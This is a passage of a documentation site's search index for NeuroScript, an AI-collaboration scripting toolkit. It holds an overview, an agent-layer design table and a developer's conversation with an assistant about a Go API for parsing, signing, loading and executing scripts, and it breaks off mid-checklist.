{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"NeuroScript: A Toolkit for AI Communication","text":""},{"location":"#foundation","title":"Foundation","text":"<p>The world utterly depends on collaboration between humans, AI agents, and traditional computer programs. NeuroScript cuts through the friction in these hybrid systems, bridging the gap between ambiguous natural language and rigid code.</p> <p>Instead of relying on hidden 'chain-of-thought' or ad-hoc prompts, NeuroScript aims to:</p> <ul> <li>Provide a shared 'language' \u2013 a toolkit of simple, readable, and executable scripts and data formats obeying the \"Principle of Least Astonishment\".</li> <li>Capture procedures and information clearly, making complex workflows explicit and repeatable.</li> <li>Foster reliable collaboration between all participants (human, AI, or computer).</li> <li>Uplift lesser AI models allowing them to do the work of greater ones.</li> </ul> <p></p>"},{"location":"#quick-examples","title":"Quick Examples","text":"<p>NeuroScript (<code>.ns.txt</code> - Defining a simple action):</p> <pre><code>:: language: neuroscript\n:: lang_version: 0.3.0\n:: file_version: 1\n\nfunc main() means\n  :: purpose: Main entry point for the script. Walks the current directory and prints file paths.\n  :: caveats: This version assumes tool.FS.Walk returns a list of maps on success and relies on on_error for tool call failures.\n\n  on_error means\n    emit \"An error occurred during script execution.\"\n    fail\n  endon\n\n  set allEntries = tool.FS.Walk(\".\")\n  must typeof(allEntries) == TYPE_LIST\n\n  emit \"Files found:\"\n  for each entry in allEntries\n    if entry[\"isDir\"] == false\n      emit \"- \" + entry[\"pathRelative\"]\n    endif\n  endfor\n  emit \"Directory scan complete.\"\n\nendfunc\n</code></pre> <p>NeuroData Checklist (<code>.ndcl</code> - Tracking tasks):</p> <pre><code>:: type: Checklist\n:: version: 0.1.0\n:: description: Simple project task list.\n\n# Main Goals\n- [x] Define Core Problem\n- [ ] Design Solution\n  - [ ] Phase 1: Core language\n  - [ ] Phase 2: Basic tools\n- [ ] Implement &amp; Test\n</code></pre>"},{"location":"#dive-deeper","title":"Dive Deeper","text":"<ul> <li>Why NeuroScript? Read the motivation and benefits.</li> <li>Core Architecture: Understand the main components (script, data, go).</li> <li>Key Concepts &amp; Features: Explore the underlying principles and features.</li> <li>Language &amp; Data Specs:<ul> <li>For Senior Tech Staff / Architects: Review the NeuroScript Language Specification, the Formal Grammar Ideas, the NeuroData Overview, and the Agent Facilities Design.</li> <li>For All: Browse the specific NeuroData format specifications.</li> </ul> </li> <li>Using <code>neurogo</code>: See the Installation &amp; Setup guide.</li> <li> <p>Code &amp; Examples:</p> <ul> <li> <p>For Developers: Browse the available Built-in Tools source, look at the examples in the library, and dive into the main Go source code.</p> </li> <li> <p>A more complete example of working code: Update NS syntax</p> </li> </ul> </li> <li> <p>Project Status &amp; Roadmap: Check the Development Checklist and the high-level Roadmap.</p> </li> <li>Frequently Asked Questions: See the FAQ.</li> <li>Contributing: Read the contribution guidelines.</li> </ul>"},{"location":"#license","title":"License","text":"<p>This project is licensed under the MIT License - see the LICENSE file for details.</p>"},{"location":"#authors","title":"Authors","text":"<p>Authors:  Andrew Price (www.eggstremestructures.com),           Gemini 2.5 Pro (Exp) (gemini.google.com)  </p> <p>:: version: 0.1.6 :: dependsOn: docs/script spec.md, docs/development checklist.md :: Authors: Andrew Price, Gemini 2.5 Pro (Exp)  </p>"},{"location":"agent_personality_discussion/","title":"Agent personality discussion","text":""},{"location":"agent_personality_discussion/#what-exactly-is-an-ai-agent-inside-an-fdm","title":"What exactly is an \u201cAI agent\u201d inside an FDM?","text":"<p>Below is a clearer, non-overlapping decomposition you can drop straight into design docs or metadata schemas.</p> Layer Core Idea Typical FDM Artefacts Notes 1. Cognitive Core (\u201cMind\u201d) The model that does the thinking. \u2022 <code>model_id</code> (OpenAI gpt-4o-mini, local LLAMA-8b, \u2026)\u2022 <code>vendor_account_id</code> (if SaaS)\u2022 <code>runtime</code> (spec: CPU/GPU reqs, container hash) One agent = one primary model series; you can hot-swap newer checkpoints under the same agent ID. 2. Disposition / Personality How the agent sounds and behaves emotionally. \u2022 <code>tone_profile.md</code> (cheerful? stoic?)\u2022 <code>temperature</code>, <code>top_p</code>, etc.\u2022 Approved style guides / taboo lists Lives alongside the model; small but high-impact knobs. 3. Authority Envelope What the agent may do. \u2022 <code>credentials.json</code> (API keys, repo tokens)\u2022 <code>capability_manifest.nd</code>\u2003  \u2013 allowed tools\u2003  \u2013 filesystem scope\u2003  \u2013 budget / token limits Enforced by Zadeh\u2019s security layer &amp; Pottery-Barn accountability. 4. Instruction Stack Why the agent exists and how it should think. (a) Mission charter \u2013 high-level goal (\u201cDefend FDM  discussions\u201d).(b) Role card(s) \u2013 concrete duties (\u201cLabel off-topic posts\u201d).(c) Operation SOPs \u2013 fine-grained recipes in NeuroScript. Stored in <code>agents/&lt;id&gt;/instructions/</code>, versioned like code. 5. Private Memory Long-lived data the agent owns. \u2022 <code>embedding_index.bin</code> (vectors of its favourite docs)\u2022 Personal notebooks / scratchpads\u2022 Reputation &amp; feedback ledger Indexed but access-controlled; other agents must request via A2A. 6. Shared Memory Hooks What the agent contributes back to the collective. \u2022 Fractal-Detail overlay links\u2022 Event logs (\u201ctagged 42 messages\u201d, \u201cproposed plan v3\u201d) First-class FDM nodes \u2192 searchable by everyone. 7. Telemetry &amp; Provenance Evidence of what it actually did. \u2022 Execution traces, cost reports\u2022 Error + retry logs Feeds the reputation engine; allows audits or rollbacks."},{"location":"agent_personality_discussion/#how-the-layers-interact-in-practice","title":"How the layers interact in practice \ud83d\udea6","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      AGENT  \u201cCurious-Curator\u201d                                       \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 1  Cognitive Core      (gpt-4o-mini)       \u2502 6  Shared Memory Hooks \u2502\n\u2502 2  Disposition          (curious, polite)  \u2502      \u21e1 overlay links   \u2502\n\u2502 3  Authority  \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592 \u2502                        \u2502\n\u2502       FS=/content/wiki   Tools=[Embed,Tag] \u2502 5  Private Memory      \u2502\n\u2502       TokenBudget=2k/hr                     \u2502      vector index      \u2502\n\u2502 4  Instruction Stack  (mission \u2192 SOPs)     \u2502                        \u2502\n\u2502                                            \u2502 7  Telemetry stream    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Startup sequence</p> <ol> <li>Zadeh loads layers 1-4 from versioned storage, validates layer 3 (credentials, quota).</li> <li>Agent spins up with its private memory mounted read-write.</li> <li>Tasks arrive via CatHerder or A2A calls.</li> <li>Outputs flow to both private (drafts, embeddings) and shared memories (final tags, overlay edges).</li> <li>Telemetry is appended asynchronously; reputation scores update.</li> </ol>"},{"location":"agent_personality_discussion/#minimal-metadata-stub-agentyaml","title":"Minimal metadata stub (<code>agent.yaml</code>)","text":"<pre><code>agent_id: curious-curator\nmodel:\n  series: gpt-4o-mini\n  vendor: openai\npersonality:\n  tone_profile: curious\n  temperature: 0.6\nauthority:\n  token_budget: 2000   # per hour\n  tools: [Embed, Tag]\n  fs_scope: /content/wiki\ninstructions:\n  mission: docs/charters/content_curation.md\n  roles:\n    - docs/roles/wiki_tagger.md\n    - docs/roles/off_topic_sentry.md\nmemory:\n  private_path: agents/curious-curator/mem\n</code></pre> <p>Key design cues</p> <ul> <li>All layers are plain files inside the FDM, versioned &amp; reviewable.</li> <li>Layers 3-4 define the sandbox; breach = fast-fail, logged to reputation.</li> <li>Personal memory (layer 5) stays searchable but only via authorised queries \u2014 no silent data hoarding.</li> <li>Swap-in a new LLM?  Update layer 1, keep layers 2-7 intact \u2192 zero-downtime personality continuity.</li> </ul>"},{"location":"api_disc/","title":"Api disc","text":""},{"location":"api_disc/#where-the-nsapi-package-stands-my-stitched-together-memory","title":"Where the <code>ns/api</code> package stands (my stitched-together memory)","text":"Area What we already specced (or partly coded) Open threads / TODO 1. Canonical-AST handling <code>Canonicalise()</code> \u2192 varint-packed blob + BLAKE3 hash.<code>SignedAST{ Blob, Sum, Sig }</code> verified with ED25519. \u2022 Benchmark vs FlatBuffers.\u2022 Plug into gateway signing micro-service. 2. Run-mode detection <code>DetectRunMode(tree) RunMode</code> returns Library, Command, or EventSink based on top-level constructs (no mixing rule). \u2022 Add fast path for \u201cno executable nodes\u201d to skip loader work. 3. Loader / Runner API <code>go\\nfunc LoadAndMaybeExec(ctx, blob) error\\n</code> \u2022 Verifies sig \u2192 decodes tree. \u2022 If Command, runs unnamed block immediately. \u2022 Otherwise caches AST for later calls/dispatch. \u2022 Transparent result cache (hash \u2192 outputs).\u2022 Gas/timeout hooks when interpreter lands. 4. Static-analysis registry <code>type Pass interface { Name(); Analyse(*Tree) []Diag }</code> Built-in passes drafted:\u2002\u2023 Schema/shape validator\u2002\u2023 Basic type checker\u2002\u2023 Capability audit\u2002\u2023 SecretRef whitelist\u2002\u2023 \u201cno-set-after-command\u201d \u2022 Wire severity gating into Gateway (<code>reject on err</code>, <code>warn on warn</code>).\u2022 Provide CLI: <code>ns vet file.ast</code>. 5. Secrets support Literal syntax <code>secret(\"scope/key\", enc=\"age\")</code> \u2192 AST node <code>SecretRef</code>.Go helper <code>secret.Decode()</code> handles <code>\"none\"</code>, <code>\"age\"</code>, <code>\"sealedbox\"</code>. \u2022 Trusted Preparer service to fetch from vault, encrypt payload, and emit SignedAST.\u2022 New error code <code>ErrorCodeSecretDecryption</code> (99909). 6. Error catalogue Shared <code>errors.go</code> with iota-based security block (99901-99908).<code>ErrorDetails</code> map + <code>FormatWithRemediation(err)</code> helper. \u2022 Add code 99909 for secret decode failure.\u2022 Expand remediation texts. 7. External execution hooks Draft interfaces: <code>go\\n type CommandRunner interface { Run(ctx, cmd string, args ...any) error }\\n type EventDispatcher interface { Emit(ev string, payload ...any) error; Register(EventHandler) }\\n</code> \u2022 Flesh out arg encoding (JSON? ND-binary?).\u2022 Provide default runner that spawns <code>ns</code> CLI for legacy tools. 8. Package layout (agreed but not pushed) ``` /api /loader      (LoadAndMaybeExec, DetectRunMode) /types       (AST, SignedAST, RunMode, SecretRef) /analysis    (Pass registry + built-ins) /secret      (Decode helpers) /errors      (shared catalogue) ``` \u2022 Write go\\:generate directives for mock AST fixtures.\u2022 Decide whether /analysis gets separate <code>go.mod</code> for plugin loading."},{"location":"api_disc/#immediate-next-shippable-chunk","title":"Immediate next shippable chunk","text":"<ol> <li>Push <code>/api/loader</code> with stub interpreter call (returns \u201cnot implemented\u201d for now).</li> <li>Bundle the first three analyser passes so gateway can start vetting blobs.</li> <li>Ship <code>secret.Decode</code> with <code>enc=\"none\"</code> only to prove the flow; add <code>age</code> after.</li> </ol> <p>That would let FDM:</p> <p>\u201cUpload SignedAST \u2192 gateway verifies \u2192 static vet passes \u2192 if type=Command run once.\u201d</p> <p>From there we iterate on interpreter integration, caching and richer secret handling.</p> <p>Let me know which slice you want carved out first (code skeleton, tests, or docs), and I\u2019ll draft it.</p> <p>AJP: I'd like to nail down the form and fit of the API before we trouble with encoding or the more advanced things. I want to make sure ns is easy to integrate first; and the api should have both script and ast doorways, so we need things to parse script to ast and fmt to get back (this may mean adding comments etc. to the ast). Could you lay out a nice usable API grammar for us? Including the things you mentioned above?</p> <p>o3:  Below is a single-screen blueprint for an \u201ceasy-to-integrate\u201d NeuroScript API. Everything is expressed as Go types + interfaces; import paths are indicative.</p> <pre><code>yourrepo/\n\u251c\u2500\u2500 api                 \u2190 public fa\u00e7ade (no deps on interpreter internals)\n\u2502   \u251c\u2500\u2500 parse.go        (Script \u21c6 AST doorway)\n\u2502   \u251c\u2500\u2500 fmt.go          (AST \u21c6 Script doorway)\n\u2502   \u251c\u2500\u2500 ast.go          (common tree types; comment + source-span support)\n\u2502   \u251c\u2500\u2500 canon.go        (canonicalise + hash helpers)\n\u2502   \u251c\u2500\u2500 sign.go         (Sign/Verify SignedAST blobs)\n\u2502   \u251c\u2500\u2500 loader.go       (LoadAndMaybeExec + run-mode detection)\n\u2502   \u251c\u2500\u2500 analysis/\n\u2502   \u2502   \u251c\u2500\u2500 pass.go     (Pass registry + Diag types)\n\u2502   \u2502   \u2514\u2500\u2500 builtin.go  (shape, typecheck, capability, secret passes)\n\u2502   \u251c\u2500\u2500 secret/         (Decode helpers; no vault coupling)\n\u2502   \u2514\u2500\u2500 errors.go       (error catalogue + remediation map)\n\u2514\u2500\u2500 internal/\u2026          (interpreter, vault client, etc.)\n</code></pre>"},{"location":"api_disc/#1-ast-fundamentals-apiastgo","title":"1\u2003AST fundamentals (<code>api/ast.go</code>)","text":"<pre><code>package api\n\n// Position = 1-based line/col in original source.\ntype Position struct{ Line, Col int }\n\n// Node is the root interface for all AST nodes.\ntype Node interface {\n    Pos() Position\n    End() Position\n    Kind() Kind\n}\n\n// Kind is a stable enum; NEVER reorder (hash depends on it).\ntype Kind uint8\n\nconst (\n    KindFile Kind = iota\n    KindCommandBlock\n    KindFuncDecl\n    KindEventHandler\n    KindSetStmt\n    KindExpr\n    KindComment             // preserved round-trip\n    KindSecretRef           // literal secret(\"scope/key\", enc=\"age\")\n    // \u2026 more \u2026\n)\n\n// Tree wraps the root node and a comment table for fmt round-trip.\ntype Tree struct {\n    Root     Node\n    Comments []Comment\n}\n\ntype Comment struct {\n    Pos  Position\n    Text string // original // or /* */ text\n}\n</code></pre> <p>Why keep comments? <code>api/fmt.go</code> can perfectly reproduce the original file (or a prettified one) \u2014 crucial for human diff reviews.</p>"},{"location":"api_disc/#2-script-ast-doorways","title":"2\u2003Script \u21c6 AST doorways","text":"<pre><code>// parse.go\npackage api\n\ntype ParseMode uint8\nconst (\n    ParsePreserveComments ParseMode = 1 &lt;&lt; iota\n    ParseSkipComments\n)\n\nfunc Parse(src []byte, mode ParseMode) (*Tree, error)\n</code></pre> <pre><code>// fmt.go\nfunc Format(tree *Tree, pretty bool) ([]byte, error)\n</code></pre> <p>Round-trip guarantee: <code>Format(Parse(x)) == x</code> when <code>pretty==false</code>.</p>"},{"location":"api_disc/#3-canonicalise-hash-sign","title":"3\u2003Canonicalise, hash &amp; sign","text":"<pre><code>// canon.go\nfunc Canonicalise(tree *Tree) (blob []byte, sum [32]byte)        // varint-packed\nfunc Decode(blob []byte) (*Tree, [32]byte, error)                // verify shape only\n</code></pre> <pre><code>// sign.go\ntype SignedAST struct {\n    Blob []byte    // canonical bytes\n    Sum  [32]byte  // BLAKE3 of Blob\n    Sig  []byte    // Ed25519\n}\n\nfunc Sign(priv ed25519.PrivateKey, blob []byte, sum [32]byte) (*SignedAST, error)\nfunc Verify(pub ed25519.PublicKey, ast *SignedAST) (*Tree, error)\n</code></pre>"},{"location":"api_disc/#4-run-time-loader","title":"4\u2003Run-time loader","text":"<pre><code>// loader.go\ntype RunMode uint8\nconst (\n    RunModeLibrary RunMode = iota // funcs only\n    RunModeCommand                // unnamed command block, run-once\n    RunModeEventSink              // one or more on-event handlers\n)\n\nfunc DetectRunMode(tree *Tree) RunMode\n\n// LoaderConfig toggles caching, gas limits, secret decode key, etc.\ntype LoaderConfig struct {\n    Cache         Cache            // optional content-addressed cache\n    MaxGas        uint64           // 0 = no limit\n    SecretPrivKey []byte           // for secret(\"\u2026\", enc=\"age\")\n}\n\ntype ExecResult struct {\n    Outputs any            // optional run value\n    Logs    []string       // or richer slog handler\n}\n\nfunc LoadAndMaybeExec(ctx context.Context, ast *SignedAST,\n                      cfg LoaderConfig) (*ExecResult, error)\n</code></pre> <p><code>LoadAndMaybeExec</code> workflow:</p> <ol> <li>Verify signature \u2192 decode \u2192 static-vet.</li> <li>DetectRunMode; if <code>RunModeCommand</code>, run immediately.</li> <li>For non-command blobs just cache the tree (future <code>func</code> calls / event dispatch).</li> </ol>"},{"location":"api_disc/#5-static-analysis-plug-ins","title":"5\u2003Static-analysis plug-ins","text":"<pre><code>// analysis/pass.go\ntype Severity uint8\nconst (\n    SevInfo Severity = iota\n    SevWarn\n    SevError\n)\n\ntype Diag struct {\n    Pos      Position\n    Severity Severity\n    Pass     string\n    Message  string\n}\n\ntype Pass interface {\n    Name() string\n    Analyse(tree *Tree) []Diag\n}\n\nfunc RegisterPass(p Pass)\nfunc Vet(tree *Tree) []Diag  // runs all registered passes\n</code></pre> <p>Built-ins (in <code>analysis/builtin.go</code>):</p> <ul> <li><code>shapeValidator</code> \u2003 (schema / Kind sanity)</li> <li><code>basicTypeCheck</code></li> <li><code>capabilityAudit</code> \u2003 (tool usage)</li> <li><code>secretWhitelist</code> \u2003 (no secret outside command)</li> <li><code>setOrder</code> \u2003 (\u201cno set after command{\u201d)</li> </ul>"},{"location":"api_disc/#6-secret-helper-plain-age-sealedbox","title":"6\u2003Secret helper (plain, age, sealedbox)","text":"<pre><code>// secret/secret.go\ntype Ref struct {\n    Path string // \"prod/db/main\"\n    Enc  string // \"none\"|\"age\"|\"sealedbox\"\n    Raw  []byte // encoded payload\n}\n\nfunc Decode(ref Ref, privKey []byte) (string, error)\n</code></pre> <p>The parser turns <code>secret(\"prod/db/main\", enc=\"age\")</code> into <code>*ast.SecretRef</code> with nil <code>Raw</code>. The Preparer service populates <code>Raw</code> before signing.</p>"},{"location":"api_disc/#7-error-catalogue-excerpt","title":"7\u2003Error catalogue (excerpt)","text":"<pre><code>type ErrorCode int\n\nconst (\n    ErrorCodeGeneric ErrorCode = 0\n    // \u2026 normal errors \u2026\n    // --- security block (iota from 99901) ---\n    ErrorCodeAttackPossible ErrorCode = 99901 + iota\n    ErrorCodeAttackProbable\n    ErrorCodeAttackCertain\n    ErrorCodeSubsystemCompromised\n    ErrorCodeSubsystemQuarantined\n    ErrorCodeEscapePossible\n    ErrorCodeEscapeProbable\n    ErrorCodeEscapeCertain\n    ErrorCodeSecretDecryption // 99909\n)\n\ntype ErrorDetails struct {\n    Code        ErrorCode\n    Summary     string\n    Remediation string\n    Severity    Severity\n}\n\nfunc Lookup(code ErrorCode) (ErrorDetails, bool)\nfunc FormatWithRemediation(err error) string\n</code></pre>"},{"location":"api_disc/#8-minimal-integration-example","title":"8\u2003Minimal integration example","text":"<pre><code>// app/main.go\nblob := fetchFromGateway()                // SignedAST\ntree, err := api.Verify(pubKey, blob)\nif err != nil { log.Fatalf(\"sig fail: %v\", err) }\n\nif diags := api.Vet(tree); hasSevError(diags) {\n    log.Fatalf(\"static-vet failed:\\n%v\", diags)\n}\n\nres, err := api.LoadAndMaybeExec(ctx, blob,\n    api.LoaderConfig{SecretPrivKey: hostKey})\nif err != nil { log.Fatalf(\"run failed: %v\", err) }\nfmt.Println(\"outputs:\", res.Outputs)\n</code></pre>"},{"location":"api_disc/#ready-to-ratify","title":"Ready to ratify?","text":"<p>If this grammar looks right, the next step is to push <code>api/ast.go</code> + <code>parse.go</code> skeletons so Gemini can start wiring the lexer/parser while you and I draft the first analyser passes.  Just say the word.</p> <p>AJP: Just to keep the distinction blindingly obvious, I split the load and exec calls thus:</p> <p>func Load(ctx context.Context, ast SignedAST,     cfg LoaderConfig) (ExecResult, error)</p> <p>func Exec(ctx context.Context, ast SignedAST,     cfg LoaderConfig) (ExecResult, error)</p> <p>Each should only accept the appropriate types or error out immediately.</p> <p>Things like Position we have in AST I think, should they have their own aliased types in API so externals only have to import the API package?</p>"},{"location":"api_disc/#1-make-the-no-surprises-wall-compile-time-hard","title":"1\u2002Make the \u201cno-surprises\u201d wall compile-time hard","text":"<p>Instead of letting both entry points accept <code>*SignedAST</code>, give each one a distinct parameter type. That way the compiler, not a runtime <code>if</code>, bars the wrong call sequence.</p> <pre><code>// api/sign.go  (unchanged)\ntype SignedAST struct {\n    Blob []byte\n    Sum  [32]byte\n    Sig  []byte\n}\n\n// api/load.go\ntype LoadedUnit struct {            // \u2190 result of Load\n    Tree     *Tree                  // verified &amp; vetted\n    Hash     [32]byte               // same as SignedAST.Sum\n    Mode     RunMode                // Library | Command | EventSink\n    RawBytes []byte                 // canonical bytes (for cache)\n}\n\n// Only transforms/validates \u2013 it **never runs** the code.\nfunc Load(ctx context.Context, s *SignedAST,\n          cfg LoaderConfig) (*LoadedUnit, error)\n</code></pre> <pre><code>// api/exec.go\ntype ExecConfig struct {\n    Cache         Cache      // may be nil\n    SecretPrivKey []byte     // for secret(\"\u2026\")\n    MaxGas        uint64\n}\n\n// Exec refuses anything except a **LoadedUnit**\nfunc Exec(ctx context.Context, lu *LoadedUnit,\n         cfg ExecConfig) (*ExecResult, error)\n</code></pre> <p>Compile-time guard: if a caller tries <code>Exec(ctx, signedAST, \u2026)</code> it simply won\u2019t build.</p>"},{"location":"api_disc/#2-loader-exec-pipeline-in-one-glance","title":"2\u2002Loader / Exec pipeline in one glance","text":"<pre><code>flowchart LR\n    blob[\"*SignedAST\"] --Load--&gt; lu[\"*LoadedUnit\"] --Exec--&gt; res[\"*ExecResult\"]\n</code></pre> <ol> <li> <p>Load</p> </li> <li> <p>Verify signature \u2192 parse/canonical compare</p> </li> <li>Run static-vet passes</li> <li>Return <code>LoadedUnit</code> (cacheable, immutable)</li> <li> <p>Exec</p> </li> <li> <p>Optionally short-circuit via cache</p> </li> <li>If <code>lu.Mode == RunModeCommand</code> run immediately</li> <li>Else register funcs / event handlers for later use</li> </ol>"},{"location":"api_disc/#3-api-wide-re-export-of-shared-structs","title":"3\u2002API-wide re-export of shared structs","text":"<p>\u201cShould externals only import <code>api</code>, not <code>api/ast</code>?\u201d Yes\u2014re-export the common lightweights so downstream code needs just one <code>import</code>.</p> <pre><code>// api/reexport.go\npackage api\n\nimport \"yourrepo/api/ast\"\n\ntype (\n    Position = ast.Position   // type alias, zero overhead\n    Kind     = ast.Kind\n    Node     = ast.Node\n    Tree     = ast.Tree\n)\n</code></pre> <p>Benefits:</p> <ul> <li>callers write <code>api.Position{Line:1,Col:5}</code>;</li> <li>the AST package remains factored;</li> <li>no extra dependencies leak out.</li> </ul>"},{"location":"api_disc/#4-minimal-integration-snippet-after-the-refactor","title":"4\u2002Minimal integration snippet (after the refactor)","text":"<pre><code>sa   := fetchBlob()                      // *SignedAST\nlu, _ := api.Load(ctx, sa, api.LoaderConfig{ /* vet opts */ })\n\nres, _ := api.Exec(ctx, lu, api.ExecConfig{\n    SecretPrivKey: hostKey,\n    MaxGas:        10_000,\n})\n\nlog.Printf(\"command outputs: %+v\", res.Outputs)\n</code></pre> <p>The loader guarantees the artefact is sane; the executor deals only with code that\u2019s already been vetted, so its trust assumptions are smaller.</p>"},{"location":"api_disc/#5-next-steps-id-code","title":"5\u2002Next steps I\u2019d code","text":"<ol> <li><code>api/load.go</code>: implement hash-check, signature verify, and the three built-in analysis passes (shape, type-check, \u201cno-set-after-command\u201d).</li> <li><code>api/exec.go</code>: stub that rejects <code>lu.Mode != RunModeCommand</code> until the interpreter is wired.</li> <li><code>api/reexport.go</code>: add the type aliases shown above.</li> </ol> <p>Let me know if this shape looks good; I can whip up the <code>LoadedUnit</code> and loader skeleton next.</p> <p>AJP: Actually, I need to make sure our internal ducks are in a row first. Could you write a quick description for Gemini on what they need to make sure is in place for the API package to talk to the lang/ast/parser/interpreter pipeline properly. Gemini will have to pull this together across 406 files. I'm thinking comments, what the tree type should look like etc. We'll likely have to make some tweaks.</p>"},{"location":"api_disc/#integration-readiness-checklist-for-the-nsapi-lang-pipeline","title":"\u201cIntegration-readiness\u201d checklist for the <code>ns/api</code> \u2194 <code>lang/*</code> pipeline","text":"<p>(One page for Gemini to pin to the monitor while stitching 400-odd files together)</p>"},{"location":"api_disc/#1-ast-contract-single-source-of-truth","title":"1\u2003AST contract (single source of truth)","text":"Must-have Notes <code>type Position struct{ Line, Col int }</code> 1-based, immutable. <code>String()</code> \u2192 <code>\"file.ns:12:7\"</code> (needed by <code>api.FormatWithRemediation</code>). <code>type Kind uint8</code> stable enum Do not reorder once published. Add new kinds at the end only. <code>type Node interface { Pos() Position; End() Position; Kind() Kind }</code> Every concrete node lives in <code>lang/ast/*</code>. <code>type Tree struct { Root Node; Comments []Comment }</code> Comments captured as their own nodes or in the slice; round-trippable. Unnamed <code>command</code> block maps to <code>*ast.CommandBlock</code> One per file; detector logic relies on <code>KindCommandBlock</code>. <code>*ast.SecretRef</code> node Fields: <code>Path string</code>, <code>Enc string</code>, <code>Raw []byte</code> (may be nil pre-prepare). <p>Public location: <code>lang/ast/ast.go</code>. The <code>api</code> package aliases these types; keep packages import-cycle-free.</p>"},{"location":"api_disc/#2-parser-guarantees-langparser","title":"2\u2003Parser guarantees (<code>lang/parser</code>)","text":"<ul> <li> <p><code>Parse(src []byte, preserveComments bool) (*ast.Tree, error)</code></p> </li> <li> <p><code>preserveComments=false</code> may drop comments for speed.</p> </li> <li> <p>On success the tree obeys invariants:</p> </li> <li> <p>Single <code>CommandBlock</code> xor \u22650 <code>FuncDecl</code> xor \u22650 <code>EventHandler</code>.</p> </li> <li>All child pointers non-nil, positions increasing.</li> <li>Returns <code>ErrSyntax</code> on first violation; caller wraps into <code>RuntimeError</code>.</li> </ul>"},{"location":"api_disc/#3-canonicaliser-langcanon","title":"3\u2003Canonicaliser (<code>lang/canon</code>)","text":"Function Contract <code>Canonicalise(tree *ast.Tree) ([]byte, [32]byte)</code> Deterministic varint encoding; same input \u2192 same bytes on any platform. <code>Decode(blob []byte) (*ast.Tree, [32]byte, error)</code> Shape validation only (no signature check). <p>Hash = BLAKE3_256 of canonical bytes. 32 bytes in <code>[32]byte</code>.</p>"},{"location":"api_disc/#4-signature-helpers-langsign","title":"4\u2003Signature helpers (<code>lang/sign</code>)","text":"<pre><code>type SignedAST struct{ Blob []byte; Sum [32]byte; Sig []byte }\n\nSign(priv ed25519.PrivateKey, blob []byte, sum [32]byte) (*SignedAST, error)\nVerify(pub ed25519.PublicKey, s *SignedAST) (*ast.Tree, error)\n</code></pre> <p><code>Verify</code> must re-canonicalise \u2192 compare <code>Sum</code> \u2192 verify <code>Sig</code>.</p>"},{"location":"api_disc/#5-interpreter-shim-langinterp","title":"5\u2003Interpreter shim (<code>lang/interp</code>)","text":"<pre><code>func ExecCommand(ctx context.Context, tree *ast.Tree,\n                 cfg interp.Config) (*api.ExecResult, error)\n</code></pre> <p>*Assumes tree has been vetted &amp; is <code>RunModeCommand</code>. <code>interp.Config</code> includes <code>SecretResolver func(ref *ast.SecretRef) (string, error)</code>.</p>"},{"location":"api_disc/#6-static-analysis-pass-hooks-langanalysis","title":"6\u2003Static-analysis pass hooks (<code>lang/analysis</code>)","text":"<p>Expose registry:</p> <pre><code>type Pass interface{ Name() string; Analyse(*ast.Tree) []api.Diag }\nfunc RegisterPass(p Pass)\n</code></pre> <p>Built-ins already drafted (shape, typecheck, capability, secret, set-order).</p>"},{"location":"api_disc/#7-error-codes-langerrors","title":"7\u2003Error codes (<code>lang/errors</code>)","text":"<ul> <li>Ensure the 99901-99909 block exactly matches the catalogue given last (add <code>ErrorCodeSecretDecryption</code>).</li> <li><code>FormatWithRemediation</code> remains in <code>api</code>, but needs <code>errors.Lookup</code> underneath.</li> </ul>"},{"location":"api_disc/#8-secrets-decoding-stub-langsecretdecodergo","title":"8\u2003Secrets decoding stub (<code>lang/secret/decoder.go</code>)","text":"<p>Provide:</p> <pre><code>func Decode(ref *ast.SecretRef, priv []byte) (string, error) // enc = \"none\"|\"age\"|\"sealedbox\"\n</code></pre> <p>Return <code>ErrSecretUnsupported</code> if <code>Enc</code> unknown; interpreter lifts to 99909.</p>"},{"location":"api_disc/#9-package-hygiene","title":"9\u2003Package hygiene","text":"<ul> <li><code>lang/*</code> must not import <code>api</code> (avoid cycles).</li> <li><code>api/reexport.go</code> should say:</li> </ul> <pre><code>type Position = ast.Position\ntype Kind     = ast.Kind\ntype Node     = ast.Node\ntype Tree     = ast.Tree\n</code></pre> <p>That way external consumers do <code>import \"yourrepo/api\"</code> only.</p>"},{"location":"api_disc/#10-smoke-test-to-keep-green","title":"10\u2003Smoke test to keep green","text":"<pre><code>go test ./api -run TestEndToEnd\n</code></pre> <p>Flow:</p> <ol> <li>Read <code>testdata/template.ns</code></li> <li>Parser \u2192 Tree</li> <li>Canonicalise \u2192 Sign (dummy key)</li> <li>Load \u2192 Vet passes</li> <li>Exec \u2192 get <code>\"hello 